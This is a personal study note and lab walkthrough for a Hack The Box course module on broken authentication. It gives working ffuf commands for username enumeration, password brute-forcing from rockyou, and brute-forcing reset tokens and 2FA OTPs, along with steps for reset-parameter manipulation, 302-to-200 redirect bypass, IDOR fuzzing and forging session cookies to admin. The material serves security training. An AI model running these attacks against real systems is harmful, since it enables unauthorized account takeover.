---
tags:
  - CWES
  - HTB
  - cybersecurity
xmind_sheet: "2"
source_file: "CWES.xmind"
---

# Broken Authentication

## Study Companion

### Prerequisites

HTTP sessions, cookies, tokens, and multi-step authentication flows.

### Learning Outcomes

- Assess enumeration, login, recovery, MFA, route protection, and session lifecycle controls.
- Separate authentication, MFA, and authorization failures.
- Evaluate entropy, rotation, fixation, invalidation, and timeout behavior.

### Practice Checkpoint

Diagram one complete authentication lifecycle from registration through logout and mark every trust decision.

### Related Knowledge Map

- [[Maps/Authentication and Access Control|Authentication and Access Control]]
- [[Study Group Guide|CWES Study Group Guide]]

> [!info] Source
> Converted from the CWES XMind mind map. Topic hierarchy, notes, links, and embedded images were preserved.

## Professional Guidance

### Objective
Evaluate the complete authentication and session lifecycle—including user discovery, passwords, reset flows, MFA, direct access, authorization-linked parameters, and session tokens—for account takeover or authentication bypass under controlled authorization.

### Assessment Workflow
1. Map registration, login, logout, password reset, security questions, MFA, protected routes, cookies, redirects, and role transitions; establish valid and invalid baselines.
2. Test user enumeration through error text, status, length, and timing using a bounded candidate set, then assess default credentials and password-policy-derived guessing without causing lockouts.
3. Review reset and MFA flows for small token spaces, missing rate limits, session-binding weaknesses, token reuse, and mismatched usernames or hidden parameters across sequential requests.
4. Request protected resources directly and inspect redirect response bodies; verify that server execution stops after redirects and that user-controlled IDs or role values cannot substitute for authentication or authorization.
5. Analyze session identifiers for entropy, static or incremental portions, reversible encodings, unsigned role data, fixation, rotation after login, logout invalidation, and risk-appropriate idle/absolute timeouts.
6. Retest mitigations: uniform messages and timing, per-account and contextual throttling, secure recovery, strong MFA attempt controls, centralized route authorization, cryptographically random signed sessions, rotation, and timeout enforcement.

### Key Testing Principles
- Authentication, MFA, and authorization are separate gates; prove which control failed and whether later controls still contain the impact.
- Preserve cookies and multi-step state when testing resets or OTPs, and stop immediately after the first authorized proof of access.
- Do not rely on IP-only throttling or client-supplied forwarding headers; evaluate controls across account, session, device, and network context.
- Avoid high-volume attempts and account lockout unless explicitly approved; favor small, policy-informed lists and known test accounts.

### Evidence and Reporting
Provide paired valid/invalid responses, attempt counts and rates, account/session context, token samples with sensitive values redacted, redirect bodies, and the minimal protected content proving bypass. State takeover prerequisites and affected roles, distinguish enumeration from compromise, and recommend uniform responses, robust rate limiting and alerting, secure recovery/MFA binding, server-side authorization, high-entropy signed session tokens, rotation, invalidation, and appropriate timeouts.

<!-- BEGIN XMIND OUTPUTS -->
## XMind Outputs

> [!output] 🟨 Yellow means output
> The source XMind contains **40 yellow/output topics** in this module.

- [[Outputs/Modules/Broken Authentication Outputs|Open the verified output list]]
<!-- END XMIND OUTPUTS -->

## Complete Technical Reference

## authentication method

### login forms

### Attacks

- Types
  - Attacking Knowledge-based Authentication
  - Attacking Ownership-based Authentication
  - Attacking Inherence-based Authentication
    - fingerprints
      - <https://www.vpnmentor.com/blog/report-biostar2-leak/>
        - The breach exposed all fingerprints and facial patterns, in addition to usernames and passwords
- Enumerating Users
  - User enumeration vulnerabilities
    - Enumerating Users via Differing Error Messages
      - password could be easily sprayed against valid accounts
        - <https://github.com/danielmiessler/SecLists/tree/master/Usernames>
          - xato-net-10-million-usernames.txt
            - ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
  - crawling a web application
  - utilizing publicly available information
    - company profiles
  - User Enumeration via Side-Channel Attacks
    - response timing
### exploit this difference in error messages

- ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
  - * FUZZ: consuelo
### LAB

- Enumerate a valid user on the web application. Provide the username as the answer.
  - use Intruder on the Login POST request
    - use xato-net-10-million-usernames.txt as the username wordlist  
      with wrong vlaue password
      - got 1 diffrent response saying Invalid Credentials
        - cookster
## Brute-Forcing Passwords

### use grep to match only those passwords that match the password policy implemented in rockyou.txt

- grep
  - `grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt`
    - wc -l custom_wordlist.txt
      - 151647 custom_wordlist.txt
- awk
  - awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt > custom_wordlist.txt
### build our ffuf command to brute-force the user's password

- ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
  - * FUZZ: Buttercup1
### LAB

- What is one prominent issue with passwords?
  - password reuse
- What is the password of the user 'admin'?
  - tar -tvf rockyou.txt.tar.gz
    - sudo awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt > custom_wordlist.txt
      - sudo ffuf -X POST -d 'username=admin&password=FUZZ' -u 'http://83.136.248.107:50034/index.php' -w custom_wordlist.txt -fr "Invalid username or password" -H "Content-Type: application/x-www-form-urlencoded"
        - Ramirez120992
## Brute-Forcing Password Reset Tokens

### password recovery functionality

- Password reset flows can be complicated because they consist of several sequential steps
### Identifying Weak Reset Tokens

- analyze
  - reset email
    - token consists of only a 4-digit number, there can be only 10,000 possible values.
### Attacking Weak Reset Tokens

- seq -w 0 9999 > tokens.txt
- ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
  - * FUZZ: 6182
### LAB

- visit rest your passwrd
  - user: admin
    - visit /reset_password.php
      - After visit we got an error "the provided token is invalid"
- FUZZ
  - seq -w 0 9999 > tokens.txt
  - ffuf -w ./tokens.txt -u http://83.136.252.32:32779/reset_password.php?token=FUZZ -fr "The provided token is invalid"
    - 4891
- Reset
  - curl http://83.136.252.32:32779/reset_password.php?token=4891 --proxy 127.0.0.1:8080
    - Hello admin please rest your password
      - 123456
        - login as  
          admin:123456
          - HTB{36da098385e641d54e1b2750721d816e}
## Brute-Forcing 2FA Codes

### specify our session token in the PHPSESSID cookie to associate the TOTP with our authenticated session.

- seq -w 0 9999 > tokens.txt
- brute-force the correct TOTP by filtering out responses containing the Invalid 2FA Code
  - ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
    - * FUZZ: 6513
    - * FUZZ: 6514
    - * FUZZ: 9999
    - we get many hits
      - because our session successfully passed the 2FA check after we had supplied the correct TOTP.
        - Since 6513 was the first hit, we can assume this was the correct TOTP
- LAB
  - Login with correct credentials
    - admin:admin
      - ffuf -X POST -b 'PHPSESSID=3bsa0u3t0s8907svf7no09n2la' -d 'otp=FUZZ' -u 'http://94.237.123.236:56830/2fa.php' -H 'Content-Type: application/x-www-form-urlencoded' -w tokens.txt -fs 732
        - 4723
        - 4723
  - visit /admin.php
    - HTB{9837b33a1ef678c380addf7ef8a517de}
## Brute-Force Prevention

### Rate Limits

- Many rate limit implementations rely on the IP address to identify the attacker.
  - However, in a real-world scenario, obtaining the attacker's IP address might not always be as simple as it seems
### X-Forward-For

- if there are middleboxes such as reverse proxies, load balancers, or web caches, a request's source IP address will belong to the middlebox, not the attacker.
  - Thus, some rate limits rely on HTTP headers such as X-Forwarded-For to obtain the actual source IP address.
    - an attacker can set arbitrary HTTP headers
      - randomizing the X-Forwarded-For
### CAPTCHAs

- it is essential not to reveal a CAPTCHA's solution in the response
  - tools and browser extensions that solve CAPTCHAs automatically are on the rise
    - Many open-source CAPTCHA solvers are available.
## Default Credentials

### lists of default credentials

- <https://www.cirt.net/passwords>
- <https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials>
- <https://github.com/scadastrangelove/SCADAPASS/tree/master>
### search in browser

## Vulnerable Password Reset

### Guessable Password Reset Questions

- "What is your mother's maiden name?"  
  "What city were you born in?"
  - can often be obtained through OSINT or guessed, given a sufficient number of attempts, i.e., a lack of brute-force protection.
    - There are multiple lists containing large cities worldwide.
      - <https://github.com/datasets/world-cities/blob/master/data/world-cities.csv>
        - can create our wordlist containing only the city name
          - cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
            - * FUZZ: Houston
        - narrow down the cities if we had additional information on our target to reduce the time required for our brute-force attack on the security question.
          - cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
### Manipulating the Reset Request

- manipulate a potentially hidden parameter to reset the password of a different account.
  - Which City were you born in?
    - POST /security_question.php HTTP/1.1  
      Host: pwreset.htb  
      Content-Length: 43  
      Content-Type: application/x-www-form-urlencoded  
      Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv  
      security_response=London&username=htb-stdnt
      - Finally, we can reset the user's password:
        - POST  
          password=P@$$w0rd&username=htb-stdnt
          - Suppose the web application does not properly verify that the usernames in both requests match
            - password=P@$$w0rd&username=admin
### LAB

- Which city is the admin user from?
  - ffuf -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded'     -b $'PHPSESSID=cqcfdbu93ekmo9d3908q8tgc16'     --data-binary $'security_response=FUZZ'  -w world-cities.txt   -u 'http://94.237.120.119:44206/security_question.php' -fr 'Incorrect'
    - Manchester
- Reset the admin user's password on the target system to obtain the flag.
  - HTB{d4740b1801d9880ff70de227a54309f0}
## Authentication Bypass via Direct Access

### Direct Access

- let us assume a web application uses the following snippet of PHP code to verify whether a user is authenticated:
  - if(!$_SESSION['active']) {  
    header("Location: index.php");  
    }
    - redirects the user to /index.php
      - the PHP script does not stop execution, resulting in protected information within the page being sent in the response body even with 302 redirection
        - HTTP/1.1 302 Found  
          ...  
          < IDOCTYPE html>  
          <html>  
          ‹title>  
          Madmin  
          </title>
          - the browser follows the redirect and displays the login prompt instead of the protected admin page
            - We can easily trick the browser into displaying the admin page by intercepting the response
              - changing the status code from 302 to 200
- To prevent the protected information from being returned in the body of the redirect response,
  - if(!$_SESSION['active']) {  
    header("Location: index.php");  
    exit;  
    }
### LAB

- visit /admin.php
  - we got 302 and html page alongside it
    - do intercept the response
      - change 302 into 200
        - HTB{913ab2d84b8db21854c696dee1f1db68}
## Authentication Bypass via Parameter Modification

### Insecure Direct Object Reference (IDOR)

- which are covered in more detail in
  - Web Attacks Module
    - <https://enterprise.hackthebox.com/academy-lab/53020/preview/modules/134>
### Parameter Modification

- we are provided with credentials for the user htb-stdnt
  - redirected to /admin.php?user_id=183
    - To investigate the purpose of the user_id parameter, let us remove it from our request to /admin.php.
      - we are redirected back to the login screen at /index.php, even though our session provided in the PHPSESSID cookie is still valid
        - we can assume that the parameter user_id is related to authentication
          - bypass authentication entirely by accessing the URL /admin.php?user_id=183 directly
### Final Remark

- many more advanced vulnerabilities can also lead to an authentication bypass
  - type juggling
    - covered in the Whitebox Attacks
      - <https://enterprise.hackthebox.com/academy-lab/53020/preview/modules/205>
  - Injection Attacks and SQL Injection Fundamentals modules
  - logic bugs
    - <https://enterprise.hackthebox.com/academy-lab/53020/preview/modules/239>
### LAB

- Apply what you learned in this section to bypass authentication to obtain the flag.
  - seq 1 9999 > idor.txt
    - ffuf -u http://94.237.122.95:59454/admin.php?user_id=FUZZ -w idor.txt  -fr 'Could not load admin data'
      - 372
        - http://94.237.122.95:59454/admin.php?user_id=372
          - HTB{63593317426484ea6d270c2159335780}
## Attacking Session Tokens

### Brute-Force Attack

- This can occur if a session token is too short or contains static data that does not provide randomness to the token
  - https://owasp.org/www-community/vulnerabilities/Insufficient_Entropy
- token is 32 characters long
  - 2c0c58b27c71a2ec5bf2b4b6e892b9f9  
    2c0c58b27c71a2ec5bf2b4546092b9f9  
    2c0c58b27c71a2ec5bf2b497f592b9f9  
    2c0c58b27c71a2ec5bf2b48bcf92b9f9  
    2c0c58b27c71a2ec5bf2b4735e92b9f9
    - consist of the static string 2c0c58b27c71a2ec5bf2b4
      - there are only four characters we need to enumerate to brute-force all existing active sessions
- incrementing session identifier
  - 141233  
    141234  
    141237  
    141238  
    141240
### Attacking Predictable Session Tokens

- While this session token might seem random at first, a simple analysis reveals that it is base64-encoded data:
  - echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
    - user=htb-stdnt;role=user
- tampering with the data
  - echo -n 'user=htb-stdnt;role=admin' | base64
    - dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
      - Cookie: session=dXN1cj1odGItc3RkbnQ7cm9sZT1hZG1pbg%3d%3d
- We should also keep an eye out for data in hexadecimal encoding or URL encoding
  - echo -n 'user=htb-stdnt;role=admin' | xxd -p
### LAB

- A session token can be brute-forced if it lacks sufficient what?
  - entropy
- Obtain administrative access on the target to obtain the flag.
  - login as  
    htb-stdnt:AcademyStudent!
    - Set-Cookie: session=757365723d6874622d7374646e743b726f6c653d75736572
      - decode hexadecimal
        - echo 757365723d6874622d7374646e743b726f6c653d75736572 | xxd -r -p
          - user=htb-stdnt;role=user
  - forge the session
    - echo -n 'user=htb-stdnt;role=admin' | xxd -p
      - 757365723d6874622d7374646e743b726f6c653d61646d696e
        - in Burp Repeater
          - Cookie: session=757365723d6874622d7374646e743b726f6c653d61646d696e
            - open in browser
              - HTB{d1f5d760d130f7dd11de93f0b393abda}
## Further Session Attacks

### Session Puzzling

- https://enterprise.hackthebox.com/academy-lab/53020/preview/modules/189
### Session Fixation

- If an attacker can coerce the victim into using a session token chosen by the attacker
  - the web application sets the user's session cookie to a value provided in the sid GET parameter.
    - An attacker obtains a valid session token
      - a1b2c3d4e5f6
        - attacker invalidates their session by logging out.
    - attacker tricks the victim into using the known session token
      - http://vulnerable.htb/?sid=a1b2c3d4e5f6
        - When the victim clicks this link
          - so it is sent along with the login request. The victim uses the attacker-provided session token since the web application does not assign a new one.
    - Since the attacker knows the victim's session token a1b2c3d4e5f6, they can hijack the victim's session.
### Improper Session Timeout

- web application must define a proper Session Timeout
  - there is no universal session timeout value
    - a web application dealing with sensitive health data should probably set a session timeout in the range of minutes.
    - social media web application might set a session timeout of multiple hours.
## Skills Assessment

### Combine the attacks you have learned in this module to obtain the flag.

- Get a credential for user
  - create new user
    - policy is
      - Contains at least one digit  
        Contains at least one lower-case character  
        Contains at least one upper-case character  
        Contains NO special characters  
        Is exactly 12 characters long
    - u:Aa1234123412
  - filter only the words match the policy
    - awk 'length($0) >= 12 && /[a-z]/ && /[A-Z]/ && /[0-9]/' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt > passwords.txt
  - inspect the response for login attempts
    - success credntials
      - welcome u!
    - wrong password
      - Invalid credentials.
    - wrong username
      - Unknown username or password.
  - username enumeration
    - ffuf -X POST -u http://94.237.56.175:43525/login.php -d 'username=FUZZ&password=Aa1234123412' -H "Content-Type: application/x-www-form-urlencoded" -fr 'Unknown username or password.' -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt
      - gladys
  - brute force gladys password
    - ffuf -X POST -u http://94.237.56.175:43525/login.php -d 'username=gladys&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded" -fr 'Invalid credentials.' -w passwords.txt
      - dWinaldasD13
- Please provide your 2FA OTP
  - 1111
    - Invalid OTP.
  - brute force OTP
    - ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
      - no FUZZING worked
- Try Manipulate the HTTP request
  - GET /profile.php
    - HTTP/1.1 302 Found  
      Location: /2fa.php  
      <HTML>
      - Render
        - You do not have admin privileges. The site is still under construction  
          and only available to admins at this time.
- Fuzz
  - ffuf -u http://154.57.164.69:31698/FUZZ -w /usr/share/wordlists/dirb/big.txt  -e .php
    - config.php  
      db.php  
      index.php  
      login.php  
      logout.php  
      profile.php  
      register.php
- Try Direct Access
  - Match and Replace
    - Response Header
      - Match /2fa.php
        - Replace /profile.php
          - Welcome gladys!  
            HTB{d86115e037388d0fa29280b737fd9171}
